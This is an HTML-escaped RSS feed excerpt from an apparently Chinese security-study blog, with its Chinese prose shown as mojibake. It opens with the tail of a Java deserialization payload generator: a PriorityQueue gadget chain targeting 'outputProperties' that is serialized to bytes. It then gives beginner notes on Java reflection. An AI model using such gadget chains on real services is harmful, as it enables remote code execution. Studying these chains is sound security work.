&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// stub data for replacement later
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;property&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;queue&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ==================
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Javaå­¦ä¹ ç¬”è®°â…¡</title><link>https://amiaaaz.github.io/2022/02/28/java-study-notes-02/</link><pubDate>Mon, 28 Feb 2022 02:40:55 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/28/java-study-notes-02/</guid><description>&lt;p>å¹¶éžJavaå¼€å‘è¦æŽŒæ¡çš„å…¨éƒ¨è¯­æ³•ï¼Œæˆ‘æŒ‘ç€æ¥çš„ï¼ˆæå‰å£°æ˜Ž&lt;/p>
&lt;hr>
&lt;p>è¿˜æ˜¯å»–å¤§çš„Javaæ•™ç¨‹&lt;/p>
&lt;h2 id="åå°„">åå°„&lt;/h2>
&lt;p>åå°„Reflectionå¯ä»¥åœ¨ç¨‹åºè¿è¡ŒæœŸï¼Œå¯¹æŸä¸ªå®žä¾‹ä¸€æ— æ‰€çŸ¥çš„æƒ…å†µä¸‹ æ‹¿åˆ°ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè°ƒç”¨å…¶æ–¹æ³•&lt;/p>
&lt;p>æ˜¯ååˆ†å¼ºå¤§çš„è¯­è¨€æ­¦å™¨&lt;/p>
&lt;h3 id="classåŠ¨æ€åŠ è½½">Class&amp;amp;åŠ¨æ€åŠ è½½&lt;/h3>
&lt;ul>
&lt;li>&lt;code>class&lt;/code>ç”±JVMåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­åŠ¨æ€åŠ è½½ï¼ŒJVMç¬¬ä¸€æ¬¡è¯»å–åˆ°ä¸€ç§&lt;code>class&lt;/code>ç±»åž‹æ—¶ å°†å…¶åŠ è½½å…¥å†…å­˜ï¼ˆä¸é‡åˆ°ä¸ä¼šé¢„å…ˆåŠ è½½ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥åšåˆ°è¿è¡ŒæœŸæ ¹æ®æ¡ä»¶åŠ è½½ä¸åŒçš„å®žçŽ°ç±»ï¼‰ï¼Œæ¯åŠ è½½ä¸€ç§&lt;code>class&lt;/code>ï¼ŒJVMå°±ä¸ºå…¶åˆ›å»ºä¸€ä¸ª&lt;code>Class&lt;/code>ç±»åž‹çš„å®žä¾‹ å¹¶ä¸Žå…¶å…³è”èµ·æ¥&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// classç±»åž‹: åå«Classçš„class
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Class&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#75af00">Class&lt;/span>&lt;span style="color:#f92672">(){}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»¥&lt;code>String&lt;/code>ç±»ä¸ºä¾‹ï¼Œå½“JVMåŠ è½½&lt;code>String&lt;/code>ç±»æ—¶ï¼Œå®ƒé¦–å…ˆè¯»å–&lt;code>String.class&lt;/code>å…¥å†…å­˜ï¼Œç„¶åŽä¸º&lt;code>String&lt;/code>ç±»åˆ›å»ºä¸€ä¸ª&lt;code>Class&lt;/code>å®žä¾‹å¹¶å…³è”èµ·æ¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ª&lt;code>Class&lt;/code>å®žä¾‹çš„æž„é€ æ–¹æ³•ä¸º&lt;code>private&lt;/code>ï¼Œåªæœ‰JVMå¯ä»¥åˆ›å»º&lt;/p>
&lt;ul>
&lt;li>JVMæŒæœ‰çš„æ¯ä¸ª&lt;code>Class&lt;/code>å®žä¾‹éƒ½æŒ‡å‘ä¸€ä¸ªæ•°æ®ç±»åž‹(class or interface)&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227104610572.png" alt="image-20220227104610572">&lt;/p>
&lt;ul>
&lt;li>ä¸€ä¸ª&lt;code>Class&lt;/code>å®žä¾‹åŒ…å«äº†è¯¥&lt;code>class&lt;/code>çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ‰€ä»¥å¦‚æžœèŽ·å–äº†æŸä¸ª&lt;code>Class&lt;/code>å®žä¾‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ª&lt;code>Class&lt;/code>å®žä¾‹èŽ·å–åˆ°è¯¥å®žä¾‹å¯¹åº”çš„&lt;code>class&lt;/code>çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¿™å°±å«åå°„Reflection&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227104646646.png" alt="image-20220227104646646">&lt;/p>
&lt;ul>
&lt;li>èŽ·å–ä¸€ä¸ª&lt;code>class&lt;/code>çš„&lt;code>Class&lt;/code>å®žä¾‹çš„ä¸‰ç§æ–¹æ³•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// é€šè¿‡ä¸€ä¸ªclassçš„é™æ€å˜é‡classèŽ·å–
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å·²ç»åŠ è½½æŸä¸ªç±» èŽ·å–å®ƒçš„java.lang.Classå¯¹è±¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// é€šè¿‡å®žä¾‹å˜é‡çš„getClassæ–¹æ³•èŽ·å–
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ä¸Šä¸‹æ–‡å·²å­˜åœ¨æŸä¸ªç±»çš„å®žä¾‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// é€šè¿‡é™æ€æ–¹æ³•Class.forNameèŽ·å–
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å‰ææ˜¯çŸ¥é“classçš„å®Œæ•´ç±»å
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.String&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å› ä¸º&lt;code>Class&lt;/code>å®žä¾‹åœ¨JVMä¸­æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥ä¸Šè¿°æ–¹æ³•èŽ·å–çš„&lt;code>Class&lt;/code>å®žä¾‹æ˜¯åŒä¸€ä¸ªå®žä¾‹ï¼Œå¯ä»¥ç”¨&lt;code>==&lt;/code>æ¯”è¾ƒ&lt;/li>
&lt;li>ä¸€èˆ¬åº”è¯¥ç”¨&lt;code>instanceof&lt;/code>åˆ¤æ–­æ•°æ®ç±»åž‹ï¼Œä¸ä½†åŒ¹é…æŒ‡å®šç±»åž‹ï¼Œè¿˜åŒ¹é…æŒ‡å®šç±»åž‹çš„å­ç±»ï¼›è€Œç”¨&lt;code>==&lt;/code>åˆ¤æ–­&lt;code>class&lt;/code>å®žä¾‹å¯ä»¥ç²¾ç¡®åœ°åˆ¤æ–­æ•°æ®ç±»åž‹ï¼Œä½†ä¸èƒ½ä½œå­ç±»åž‹æ¯”è¾ƒ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºnæ˜¯Integerç±»åž‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºnæ˜¯Numberç±»åž‹çš„å­ç±»
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºn.getClass()è¿”å›žInteger.class
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// falseï¼Œå› ä¸ºInteger.class!=Number.class
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>é€šè¿‡åå°„èŽ·å–å®žä¾‹çš„åŸºæœ¬ä¿¡æ¯çš„å°æ —å­&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// æ³¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Month&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Class name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Simple name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSimpleName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPackage&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Package name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPackage&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is interface: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isInterface&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is enum: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isEnum&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is array: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isArray&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is primitive: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPrimitive&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;code>String[]&lt;/code>ä¹Ÿæ˜¯ä¸€ç§ç±»ï¼Œä¸åŒäºŽ&lt;code>String.class&lt;/code>ï¼Œå®ƒçš„ç±»åæ˜¯&lt;code>[Ljava.lang.String;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ¯ä¸€ç§åŸºæœ¬ç±»åž‹å¯¹åº”çš„&lt;code>Class&lt;/code>å®žä¾‹å¯ä»¥ç”¨&lt;code>åŸºæœ¬ç±»åž‹.class&lt;/code>è®¿é—®&lt;/p>
&lt;/li>
&lt;li>
&lt;p>èŽ·å–åˆ°&lt;code>Class&lt;/code>å®žä¾‹åŽå¯ä»¥ç”¨å®ƒæ¥åˆ›å»ºå¯¹åº”ç±»åž‹çš„å®žä¾‹ï¼Œä¸Žç›´æŽ¥newçš„ç›¸æ¯”ï¼Œå±€é™åœ¨äºŽåªèƒ½è°ƒç”¨&lt;code>public&lt;/code>çš„æ— å‚æ•°æž„é€ æ–¹æ³•ï¼Œè€Œæœ‰å‚æ•°çš„æž„é€ æ–¹æ³• æˆ–éž&lt;code>public&lt;/code>çš„æž„é€ æ–¹æ³•éƒ½æ— æ³•é€šè¿‡&lt;code>Class.newInstance()&lt;/code>è°ƒç”¨&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
